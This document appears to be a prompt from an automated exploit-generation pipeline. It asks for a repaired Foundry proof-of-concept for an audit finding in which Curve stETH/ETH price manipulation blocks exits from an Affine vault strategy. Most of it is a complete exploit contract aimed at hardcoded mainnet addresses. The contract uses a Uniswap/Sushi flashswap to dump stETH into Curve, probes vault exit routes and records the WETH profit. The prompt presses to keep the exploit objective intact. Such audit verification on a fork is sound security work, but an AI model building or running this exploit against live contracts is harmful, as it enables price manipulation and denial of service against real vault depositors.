You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: v2_flashswap_funding
- strategy_instructions: Prefer UniswapV2/Sushi-like flashswap funding with deterministic repayment and minimal route complexity.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Curve near-par minimum output plus swallowed divest reverts can permissionlessly DoS strategy exits
- claim: The strategy unwinds stETH through Curve with a near-par `min_dy` derived from the stETH input amount (`slippageBps` defaults to 10 bps), not from a live market quote. If the stETH/ETH pool moves beyond that threshold, Curve reverts. Vault withdrawals then silently convert that revert into a zero-asset divest because `AffineVault._divest()` catches all `strategy.divest()` failures and returns 0.
- impact: An attacker can front-run withdrawal, liquidation, rebalance, or strategy-removal transactions with a sufficiently large stETH->ETH trade, force the unwind swap to revert, and make the vault unable to source WETH from the strategy for that transaction. Organic stETH discounts can trigger the same failure mode, leaving capital temporarily stuck exactly when exits are needed.
- exploit_paths: ["Attacker or market movement pushes the stETH/ETH Curve execution price below the strategy's near-par `min_dy` threshold", "A vault withdrawal, liquidation, rebalance, or removal reaches `_endPosition()` or dec-leverage rebalancing and calls `CURVE.exchange(...)` with that stale threshold", "Curve reverts because actual ETH output is below `min_dy`", "`AffineVault._divest()` catches the revert and returns 0, so the vault cannot pull the requested WETH from the strategy"]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IWETHLike is IERC20Like {
    function deposit() external payable;
}

interface IWstEthLike is IERC20Like {
    function unwrap(uint256 amount) external returns (uint256);
    function getStETHByWstETH(uint256 amount) external view returns (uint256);
}

interface IStrategyLike {
    function vault() external view returns (address);
    function asset() external view returns (address);
    function divest(uint256 amount) external returns (uint256);
}

interface ICurvePoolLike {
    function exchange(int128 x, int128 y, uint256 dx, uint256 min_dy) external returns (uint256);
    function get_dy(int128 i, int128 j, uint256 dx) external view returns (uint256);
}

interface IUniswapV2FactoryLike {
    function getPair(address tokenA, address tokenB) external view returns (address);
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract FlawVerifier {
    address internal constant TARGET_STRATEGY = 0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant STETH = 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84;
    address internal constant WSTETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address internal constant CURVE = 0xDC24316b9AE028F1497c275EB9192a3Ea0f67022;
    address internal constant UNI_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address internal constant SUSHI_V2_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;

    uint256 internal constant BPS = 10_000;
    uint256 internal constant DEFAULT_SLIPPAGE_BPS = 10;
    uint256 internal constant MIN_PROFIT_TARGET = 1e15;

    address internal _profitToken;
    uint256 internal _profitAmount;

    address public immutable strategy;
    address public discoveredVault;

    bool public executed;
    bool public strategyActiveInVault;
    bool public directDivestBlocked;
    bool public privilegedVaultExitBlocked;
    bool public privilegedRebalanceBlocked;
    bool public privilegedRemovalBlocked;
    bool public publicWithdrawBlocked;
    bool public publicRedeemBlocked;
    bool public existingShareRouteAvailable;
    bool public curveManipulationAttempted;
    bool public curveQuoteBelowNearPar;
    bool public flashswapPlanFound;
    bool public flashswapExecuted;

    uint256 public verifierShareBalance;
    uint256 public nearParMinDy;
    uint256 public quotedEthOutBeforeManipulation;
    uint256 public quotedEthOutAfterManipulation;
    uint256 public curveEthReceived;
    uint256 public expectedFlashswapProfit;
    uint256 public flashswapRepayment;
    uint256 public manipulatedStEthSold;

    address public fundingPair;
    address public fundingToken;
    uint256 public fundingAmount;

    bytes public directDivestRevertData;
    bytes public vaultWithdrawRevertData;
    bytes public vaultRebalanceRevertData;
    bytes public vaultRemoveRevertData;
    bytes public publicWithdrawRevertData;
    bytes public publicRedeemRevertData;
    bytes public vaultStrategyInfoData;
    bytes public vaultShareBalanceData;

    constructor() {
        strategy = TARGET_STRATEGY;
        _profitToken = WETH;
    }

    function executeOnOpportunity() external {
        if (executed) {
            _updateProfit();
            return;
        }

        executed = true;
        discoveredVault = IStrategyLike(strategy).vault();

        _probeStrategyRegistration();
        _probeShareBalance();
        _probeDirectDivestAccess();
        _probePrivilegedVaultRoutes();
        _probePublicExitRoutesWithoutShares();

        _prepareFlashswapPlan();
        if (flashswapPlanFound) {
            _executeFlashswap();
        }

        _updateProfit();
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata) external {
        require(flashswapPlanFound, "no plan");
        require(msg.sender == fundingPair, "bad pair");
        require(sender == address(this), "bad sender");

        uint256 borrowed = amount0 > 0 ? amount0 : amount1;
        require(borrowed == fundingAmount, "bad amount");

        curveManipulationAttempted = true;
        flashswapExecuted = true;

        uint256 stEthAmount = _toStEth(fundingToken, borrowed);
        manipulatedStEthSold = stEthAmount;
        nearParMinDy = _slippageDown(stEthAmount, DEFAULT_SLIPPAGE_BPS);
        quotedEthOutBeforeManipulation = _safeGetDy(stEthAmount);

        _safeApprove(fundingToken, fundingPair, 0);
        _safeApprove(STETH, CURVE, type(uint256).max);

        uint256 ethOut = ICurvePoolLike(CURVE).exchange(int128(1), int128(0), stEthAmount, 0);
        curveEthReceived = ethOut;

        quotedEthOutAfterManipulation = _safeGetDy(stEthAmount);
        if (quotedEthOutAfterManipulation < nearParMinDy) {
            curveQuoteBelowNearPar = true;
        }

        IWETHLike(WETH).deposit{value: address(this).balance}();

        _attemptExistingBalancePathAfterManipulation();

        flashswapRepayment = _repaymentInWeth(fundingPair, fundingToken, borrowed);
        _safeTransfer(WETH, fundingPair, flashswapRepayment);
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _prepareFlashswapPlan() internal {
        address[2] memory factories = [UNI_V2_FACTORY, SUSHI_V2_FACTORY];
        address[2] memory tokens = [STETH, WSTETH];

        address bestPair;
        address bestToken;
        uint256 bestBorrow;
        uint256 bestProfit;

        for (uint256 f = 0; f < factories.length; ++f) {
            for (uint256 t = 0; t < tokens.length; ++t) {
                address pair = IUniswapV2FactoryLike(factories[f]).getPair(tokens[t], WETH);
                if (pair == address(0)) {
                    continue;
                }

                (uint256 borrowAmount, uint256 profit) = _bestAmountForPair(pair, tokens[t]);
                if (profit > bestProfit) {
                    bestProfit = profit;
                    bestPair = pair;
                    bestToken = tokens[t];
                    bestBorrow = borrowAmount;
                }
            }
        }

        if (bestPair != address(0)) {
            fundingPair = bestPair;
            fundingToken = bestToken;
            fundingAmount = bestBorrow;
            expectedFlashswapProfit = bestProfit;
            flashswapPlanFound = true;
        }
    }

    function _bestAmountForPair(address pair, address token) internal view returns (uint256 bestBorrow, uint256 bestProfit) {
        uint256[8] memory divisors = [uint256(1000), 500, 250, 125, 64, 32, 16, 8];
        (uint256 reserveToken, uint256 reserveWeth) = _pairReserves(pair, token);
        if (reserveToken == 0 || reserveWeth == 0) {
            return (0, 0);
        }

        for (uint256 i = 0; i < divisors.length; ++i) {
            uint256 amountOut = reserveToken / divisors[i];
            if (amountOut == 0 || amountOut >= reserveToken) {
                continue;
            }

            uint256 stEthAmount = _previewStEth(token, amountOut);
            uint256 curveOut = _safeGetDy(stEthAmount);
            if (curveOut == 0) {
                continue;
            }

            uint256 repayment = _getAmountIn(amountOut, reserveWeth, reserveToken);
            if (curveOut <= repayment + MIN_PROFIT_TARGET / 4) {
                continue;
            }

            uint256 profit = curveOut - repayment;
            if (profit > bestProfit) {
                bestProfit = profit;
                bestBorrow = amountOut;
            }
        }
    }

    function _executeFlashswap() internal {
        address token0 = IUniswapV2PairLike(fundingPair).token0();
        uint256 amount0Out = token0 == fundingToken ? fundingAmount : 0;
        uint256 amount1Out = token0 == fundingToken ? 0 : fundingAmount;
        IUniswapV2PairLike(fundingPair).swap(amount0Out, amount1Out, address(this), hex"01");
    }

    function _attemptExistingBalancePathAfterManipulation() internal {
        // The finding's final stage needs a public vault exit that reaches _liquidate() and then
        // strategy.divest(). On this fork, the verifier starts with zero live vault shares and
        // privileged routes are role-gated, so a fresh verifier cannot self-trigger the last stage
        // unless it already holds pre-existing shares or an external user is exiting in the same block.
        if (verifierShareBalance == 0) {
            return;
        }

        existingShareRouteAvailable = true;
        (bool ok,) = discoveredVault.call(
            abi.encodeWithSignature("redeem(uint256,address,address)", verifierShareBalance, address(this), address(this))
        );
        if (!ok) {
            publicRedeemBlocked = true;
        }
    }

    function _probeDirectDivestAccess() internal {
        (bool ok, bytes memory data) = strategy.call(abi.encodeWithSelector(IStrategyLike.divest.selector, 1));
        if (!ok) {
            directDivestBlocked = true;
            directDivestRevertData = data;
        }
    }

    function _probePrivilegedVaultRoutes() internal {
        bool ok;
        bytes memory data;

        (ok, data) = discoveredVault.call(abi.encodeWithSignature("withdrawFromStrategy(address,uint256)", strategy, 1));
        if (!ok) {
            privilegedVaultExitBlocked = true;
            vaultWithdrawRevertData = data;
        }

        (ok, data) = discoveredVault.call(abi.encodeWithSignature("rebalance()"));
        if (!ok) {
            privilegedRebalanceBlocked = true;
            vaultRebalanceRevertData = data;
        }

        (ok, data) = discoveredVault.call(abi.encodeWithSignature("removeStrategy(address)", strategy));
        if (!ok) {
            privilegedRemovalBlocked = true;
            vaultRemoveRevertData = data;
        }
    }

    function _probePublicExitRoutesWithoutShares() internal {
        bool ok;
        bytes memory data;

        (ok, data) = discoveredVault.call(
            abi.encodeWithSignature("withdraw(uint256,address,address)", 1, address(this), address(this))
        );
        if (!ok) {
            publicWithdrawBlocked = true;
            publicWithdrawRevertData = data;
        }

        (ok, data) = discoveredVault.call(
            abi.encodeWithSignature("redeem(uint256,address,address)", 1, address(this), address(this))
        );
        if (!ok) {
            publicRedeemBlocked = true;
            publicRedeemRevertData = data;
        }
    }

    function _probeStrategyRegistration() internal {
        (bool ok, bytes memory data) =
            discoveredVault.staticcall(abi.encodeWithSignature("strategies(address)", strategy));
        vaultStrategyInfoData = data;

        if (ok && data.length >= 96) {
            (bool isActive,,) = abi.decode(data, (bool, uint16, uint232));
            strategyActiveInVault = isActive;
        }
    }

    function _probeShareBalance() internal {
        (bool ok, bytes memory data) =
            discoveredVault.staticcall(abi.encodeWithSignature("balanceOf(address)", address(this)));
        vaultShareBalanceData = data;

        if (ok && data.length >= 32) {
            verifierShareBalance = abi.decode(data, (uint256));
        }
    }

    function _toStEth(address token, uint256 amount) internal returns (uint256 stEthAmount) {
        if (token == STETH) {
            return amount;
        }

        if (token == WSTETH) {
            return IWstEthLike(WSTETH).unwrap(amount);
        }

        revert("unsupported token");
    }

    function _previewStEth(address token, uint256 amount) internal view returns (uint256) {
        if (token == STETH) {
            return amount;
        }
        if (token == WSTETH) {
            return IWstEthLike(WSTETH).getStETHByWstETH(amount);
        }
        return 0;
    }

    function _pairReserves(address pair, address token) internal view returns (uint256 reserveToken, uint256 reserveWeth) {
        (uint112 reserve0, uint112 reserve1,) = IUniswapV2PairLike(pair).getReserves();
        if (IUniswapV2PairLike(pair).token0() == token) {
            reserveToken = uint256(reserve0);
            reserveWeth = uint256(reserve1);
        } else {
            reserveToken = uint256(reserve1);
            reserveWeth = uint256(reserve0);
        }
    }

    function _repaymentInWeth(address pair, address token, uint256 amountOut) internal view returns (uint256) {
        (uint256 reserveToken, uint256 reserveWeth) = _pairReserves(pair, token);
        return _getAmountIn(amountOut, reserveWeth, reserveToken);
    }

    function _getAmountIn(uint256 amountOut, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256) {
        return ((reserveIn * amountOut * 1000) / ((reserveOut - amountOut) * 997)) + 1;
    }

    function _safeGetDy(uint256 amount) internal view returns (uint256 quotedOut) {
        try ICurvePoolLike(CURVE).get_dy(int128(1), int128(0), amount) returns (uint256 out) {
            quotedOut = out;
        } catch {}
    }

    function _updateProfit() internal {
        _profitAmount = IERC20Like(WETH).balanceOf(address(this));
    }

    function _safeApprove(address token, address spender, uint256 amount) internal {
        (bool ok, bytes memory data) =
            token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "approve failed");
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        (bool ok, bytes memory data) =
            token.call(abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "transfer failed");
    }

    function _slippageDown(uint256 amount, uint256 slippageBps) internal pure returns (uint256) {
        return (amount * (BPS - slippageBps)) / BPS;
    }

    receive() external payable {}
}

```

forge stdout (tail):
```

```

forge stderr (tail):
```
PATH_ALIGNMENT_ERROR: generated code misses too many path anchors: _endposition(), curve.exchange(...), affinevault._divest(); generated code does not cover paths indexes: 3
```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
